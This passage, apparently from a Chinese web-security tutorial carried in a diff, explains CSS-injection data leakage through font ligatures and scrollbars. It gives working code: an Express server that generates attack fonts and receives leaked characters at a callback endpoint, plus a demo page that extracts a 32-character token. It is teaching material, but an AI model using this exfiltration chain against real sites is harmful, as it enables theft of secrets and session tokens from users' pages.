+<h4 id="9-3-4-泄露-JavaScript-代码"><a href="#9-3-4-泄露-JavaScript-代码" class="headerlink" title="9.3.4 泄露 JavaScript 代码"></a>9.3.4 泄露 JavaScript 代码</h4><p>通过利用连字和 scrollbar ，我们可以一个字元一个字元慢慢地泄露出页面上的内容，甚至JavaScript的代码：</p>
+<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">head, script</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>使用上述 CSS 可以让 script 内容也显示在画面上，<br>因此我们也可以利用同样的技巧，泄露 script 的内容：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">var</span> secret <span class="token operator">=</span> <span class="token string">"abc123"</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">var</span> secret2 <span class="token operator">=</span> <span class="token string">"cba321"</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>defs</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">horiz-adv-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font-face</span> <span class="token attr-name">font-family</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hack<span class="token punctuation">"</span></span> <span class="token attr-name">units-per-em</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>glyph</span> <span class="token attr-name">unicode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>a<span class="token punctuation">'</span></span> <span class="token attr-name">horiz-adv-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>99999<span class="token punctuation">"</span></span> <span class="token attr-name">d</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>M1 0z<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>defs</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+    <span class="token selector">script</span> <span class="token punctuation">&#123;</span>
+      <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
+      <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"hack"</span><span class="token punctuation">;</span>
+      <span class="token property">white-space</span><span class="token punctuation">:</span>n owrap<span class="token punctuation">;</span>
+      <span class="token property">overflow-x</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
+      <span class="token property">width</span><span class="token punctuation">:</span> 500px<span class="token punctuation">;</span>
+      <span class="token property">background</span><span class="token punctuation">:</span>lightblue<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token selector">script::-webkit-scrollbar</span> <span class="token punctuation">&#123;</span>
+      <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+<p>以上示例中包含两段 js 代码：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> secret <span class="token operator">=</span> <span class="token string">"abc123"</span>
+<span class="token keyword">var</span> secret2 <span class="token operator">=</span> <span class="token string">"cba321"</span></code></pre>
+
+<p>由于样式表中的设置，只要存在 “a 连字，就会渲染一个超宽的宽度，<br>就会导致 scrollbar 的出现，背景就会变为蓝色，效果如下：</p>
+<p><img src="image-.png" alt="image-8.png"></p>
+<p>上面的部分是因为内容为 <code>var secret = &quot;abc123&quot;</code> ，包含了 “a 的连字，<br>因此宽度变为超宽，scrollbar 出现，背景变为蓝色。</p>
+<p>下面的部分是因为没有 “a 的连字，所以 scrollbar 没出现。<br>（有 a 的地方都会缺字，应该与没有定义其他的 glyph 有关，但不影响结果）</p>
+<p>因此只要把 scrollbar 的背景换成 URL，就可以从 server 端获得泄露的信息。</p>
+<h4 id="9-3-5-字体的产生"><a href="#9-3-5-字体的产生" class="headerlink" title="9.3.5 字体的产生"></a>9.3.5 字体的产生</h4><p>我们在 9.3.4 中展示的示例仅能在 Safari 浏览器中起作用，<br>这是因为仅有 Safari 支持 SVG font，不需要从 server 中产生字体，<br>而对于其他的浏览器，我们需要在 server 端来产生连字字体</p>
+<p>借助 Fontforge 等软件，我们可以在字体中创建自己的字体以及我们自己的连字。</p>
+<blockquote>
+<p>Fontforge 是一种用于创建字体的高级工具，我们将使用它来将字体从 SVG 格式更改为 WOFF 。这是必要的，因为浏览器已经停止支持字体中的SVG格式（因此需要使用WOFF格式），而从我们的角度来看，以SVG格式定义字体是迄今为止最方便的。FontForge 允许您定义脚本以执行不同字体格式之间的转换。</p>
+</blockquote>
+<p>让我们准备一个名为 script.fontforge 的文件，其中包含以下内容：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/fontforge</span>
+Open<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">)</span>
+Generate<span class="token punctuation">(</span><span class="token variable">$1</span>:r + <span class="token string">".woff"</span><span class="token punctuation">)</span></code></pre>
+<p>触发该脚本后，该脚本将创建一个名为 <code>&lt;file&gt;.woff</code> 的文件。<br>通过这种简单的方式，我们以字体格式创建了一个简单的转换器。</p>
+<p>接下来我们使用 node.js 配置字体生成 server：</p>
+<p>package.json：</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"css-attack-2"</span><span class="token punctuation">,</span>
+  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>
+  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"index.js"</span><span class="token punctuation">,</span>
+  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
+  <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"ISC"</span><span class="token punctuation">,</span>
+  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.15.5"</span><span class="token punctuation">,</span>
+    <span class="token property">"js-cookie"</span><span class="token operator">:</span> <span class="token string">"^2.1.4"</span><span class="token punctuation">,</span>
+    <span class="token property">"js2xmlparser"</span><span class="token operator">:</span> <span class="token string">"^3.0.0"</span><span class="token punctuation">,</span>
+    <span class="token property">"rimraf"</span><span class="token operator">:</span> <span class="token string">"^2.6.2"</span><span class="token punctuation">,</span>
+    <span class="token property">"tmp"</span><span class="token operator">:</span> <span class="token string">"0.0.33"</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>main.js：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// Server ExprssJS by default adds ETag headline,</span>
+<span class="token comment">// but we don’t need it so we turn it off.</span>
+app<span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token string">'etag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+<span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token number">3001</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> js2xmlparser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'js2xmlparser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> tmp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'tmp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> rimraf <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'rimraf'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+ 
+<span class="token comment">// Generate a font for a given prefix </span>
+<span class="token comment">// and the characters for which the ligature is to be created</span>
+<span class="token keyword">function</span> <span class="token function">createFont</span><span class="token punctuation">(</span><span class="token parameter">prefix<span class="token punctuation">,</span> charsToLigature</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> font <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string-property property">"defs"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"font"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                    <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"hack"</span><span class="token punctuation">,</span>
+                    <span class="token string-property property">"horiz-adv-x"</span><span class="token operator">:</span> <span class="token string">"0"</span>
+                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+                <span class="token string-property property">"font-face"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                    <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                        <span class="token string-property property">"font-family"</span><span class="token operator">:</span> <span class="token string">"hack"</span><span class="token punctuation">,</span>
+                        <span class="token string-property property">"units-per-em"</span><span class="token operator">:</span> <span class="token string">"1000"</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+                <span class="token string-property property">"glyph"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    
+    <span class="token comment">// By default all possible characters have a zero width...</span>
+    <span class="token keyword">let</span> glyphs <span class="token operator">=</span> font<span class="token punctuation">.</span>defs<span class="token punctuation">.</span>font<span class="token punctuation">.</span>glyph<span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span> c <span class="token operator">&lt;=</span> <span class="token number">0x7e</span><span class="token punctuation">;</span> c <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> glyph <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                <span class="token string-property property">"unicode"</span><span class="token operator">:</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string-property property">"horiz-adv-x"</span><span class="token operator">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>
+                <span class="token string-property property">"d"</span><span class="token operator">:</span> <span class="token string">"M1 0z"</span><span class="token punctuation">,</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        glyphs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>glyph<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    
+    <span class="token comment">// ... except ligatures, which are EXTREMELY wide.</span>
+    charsToLigature<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">c</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> glyph <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                <span class="token string-property property">"unicode"</span><span class="token operator">:</span> prefix <span class="token operator">+</span> c<span class="token punctuation">,</span>
+                <span class="token string-property property">"horiz-adv-x"</span><span class="token operator">:</span> <span class="token string">"10000"</span><span class="token punctuation">,</span>
+                <span class="token string-property property">"d"</span><span class="token operator">:</span> <span class="token string">"M1 0z"</span><span class="token punctuation">,</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        glyphs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>glyph<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token comment">// We convert JSON-a to SVG.</span>
+    <span class="token keyword">const</span> xml <span class="token operator">=</span> js2xmlparser<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"svg"</span><span class="token punctuation">,</span> font<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token comment">// And next we use fontforge</span>
+    <span class="token comment">// to change SVG to WOFF.</span>
+    <span class="token keyword">const</span> tmpobj <span class="token operator">=</span> tmp<span class="token punctuation">.</span><span class="token function">dirSync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tmpobj<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/font.svg</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> xml<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">"/usr/bin/fontforge"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
+        <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>__dirname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/script.fontforge</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
+        <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tmpobj<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/font.svg</span><span class="token template-punctuation string">`</span></span>
+    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token keyword">const</span> woff <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tmpobj<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/font.woff</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token comment">// We delete temporary directory.</span>
+    rimraf<span class="token punctuation">.</span><span class="token function">sync</span><span class="token punctuation">(</span>tmpobj<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token comment">// and we give back font in the form of WOFF.</span>
+    <span class="token keyword">return</span> woff<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+ 
+<span class="token comment">// Endpoint for generating fonts.</span>
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/font/:prefix/:charsToLigature"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> prefix<span class="token punctuation">,</span> charsToLigature <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">;</span>
+    
+    <span class="token comment">// We make sure that the font is in the cache.</span>
+    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+        <span class="token string-property property">'Cache-Control'</span><span class="token operator">:</span> <span class="token string">'public, max-age=600'</span><span class="token punctuation">,</span>
+        <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/font-woff'</span><span class="token punctuation">,</span>
+        <span class="token string-property property">'Access-Control-Allow-Origin'</span><span class="token operator">:</span> <span class="token string">'*'</span><span class="token punctuation">,</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">createFont</span><span class="token punctuation">(</span>prefix<span class="token punctuation">,</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>charsToLigature<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+<span class="token comment">// Endpoint to accept characters via a callback connection</span>
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/reverse/:chars"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'chars'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>chars<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">chars=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>chars<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; Path=/</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/cookie.js'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">'js.cookie.js'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">root</span><span class="token operator">:</span> <span class="token string">'./node_modules/js-cookie/src/'</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/index.html'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">root</span><span class="token operator">:</span> <span class="token string">'.'</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Listening on </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">...</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>
+
+<p>demo.html</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>utf-8</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>cookie.js</span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>big</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>token</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>big</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> <span class="token constant">EXPECTED_TOKEN_LENGTH</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> <span class="token constant">ALPHABET</span> <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token punctuation">;</span>
+        <span class="token comment">// 显示已读取的令牌</span>
+        <span class="token keyword">const</span> outputElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+        <span class="token comment">// 存储已提取的令牌</span>
+        <span class="token keyword">let</span> extractedToken <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+        
+        <span class="token comment">// 存储用于创建连字的前缀</span>
+        <span class="token keyword">let</span> prefix <span class="token operator">=</span> <span class="token string">'"'</span><span class="token punctuation">;</span>
+        
+        <span class="token comment">// 泄露另一个标记字符，直到泄露所有字符</span>
+        
+        <span class="token keyword">while</span> <span class="token punctuation">(</span>extractedToken<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token constant">EXPECTED_TOKEN_LENGTH</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">const</span> nextTokenChar <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getNextTokenCharacter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            extractedToken <span class="token operator">+=</span> nextTokenChar<span class="token punctuation">;</span>
+            
+            <span class="token comment">// 将取出的标志添加到前缀中用于进一步的连字</span>
+            prefix <span class="token operator">+=</span> nextTokenChar<span class="token punctuation">;</span>
+            
+            <span class="token comment">// 在页面上显示目前为止我们已经提取出的 token 部分</span>
+            outputElement<span class="token punctuation">.</span>textContent <span class="token operator">=</span> extractedToken<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token comment">// 当运行到这里时，我们已经拥有了完整的 token</span>
+        <span class="token comment">// 删除所有 iframe 并将 token 以粗体显示</span>
+        <span class="token function">deleteAllIframes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        outputElement<span class="token punctuation">.</span>style<span class="token punctuation">.</span>fontWeight <span class="token operator">=</span> <span class="token string">'bold'</span><span class="token punctuation">;</span>
+        
+        <span class="token comment">// 使用分治的方法提取下一个标记字符的函数</span>
+        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getNextTokenCharacter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token comment">// 出于性能目的 - 删除所有现有的 iframe 元素</span>
+            <span class="token function">deleteAllIframes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+            <span class="token keyword">let</span> alphabet <span class="token operator">=</span> <span class="token constant">ALPHABET</span><span class="token punctuation">;</span>
+            <span class="token comment">//下一个标记字符是什么。</span>
+            <span class="token keyword">while</span> <span class="token punctuation">(</span>alphabet<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token comment">// 等待创建一个新的 cookie - 所以首先让我们删除所有现有的 cookie</span>
+                <span class="token function">clearAllCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                
+                <span class="token keyword">const</span> <span class="token punctuation">[</span>leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">split</span><span class="token punctuation">(</span>alphabet<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                
+                <span class="token comment">// 首先，我们确保两组连字的字体都在缓存中</span>
+                <span class="token keyword">await</span> <span class="token function">makeSureFontsAreCached</span><span class="token punctuation">(</span>leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                
+                <span class="token comment">// 此处人为延迟会减少的攻击逃逸的可能性</span>
+                <span class="token keyword">await</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                
+                <span class="token comment">// 然后我们使用“攻击”CSS 创建两个 iframe</span>
